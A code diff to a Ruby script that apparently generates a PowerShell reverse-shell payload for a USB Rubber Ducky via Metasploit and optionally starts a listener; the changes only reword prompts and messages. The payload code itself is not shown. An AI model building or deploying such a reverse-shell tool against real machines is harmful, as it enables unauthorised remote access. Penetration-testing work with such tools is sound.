@@ -26,18 +26,18 @@ def rgets(prompt = '', default = '')
 end
 
 def select_host
-  host_name = rgets('Enter the host ip to listen on: ')
+  host_name = rgets('Enter the IP Address for the listener: ')
   ip = host_name.split('.')
   if ip[0] == nil? || ip[1] == nil? || ip[2] == nil? || ip[3] == nil?
     print_error("Not a valid IP\n")
     select_host
   end
-  print_success("Using #{host_name} as server\n")
+  print_success("#{host_name} will be used\n")
   host_name
 end
 
 def select_port
-  port = rgets('Port you would like to use or leave blank for [443]: ')
+  port = rgets('Enter the port you would like to use or click enter to use default [443]: ')
   if port == ''
     port = '443'
     print_success("Using #{port}\n")
@@ -106,7 +106,7 @@ def ducky_setup(encoded_command)
   File.open('powershell_reverse_ducky.txt', 'w') do |f|
     f.write(s)
   end
-  print_success("File Complete\n")
+  print_success("Finished writing file\n")
 end
 
 def metasploit_setup(msf_path, host, port)
@@ -137,8 +137,8 @@ begin
   port = select_port
   encoded_command = shellcode_gen(msf_path, host, port)
   ducky_setup(encoded_command)
-  msf_setup = rgets('Would you like to start the listener?[yes/no] ')
-  print_info("Compile powershell_reverse_ducky.txt with duckencode.jar\n")
+  msf_setup = rgets('Would you like to start the listener? [yes/no] ')
+  print_info("Payload saved as 'reverse_powershell_payload.bat' -- View README.md for information on how to encode the .bat file as an .exe file.\n")
   metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
   print_info("Good Bye!\n")
 end
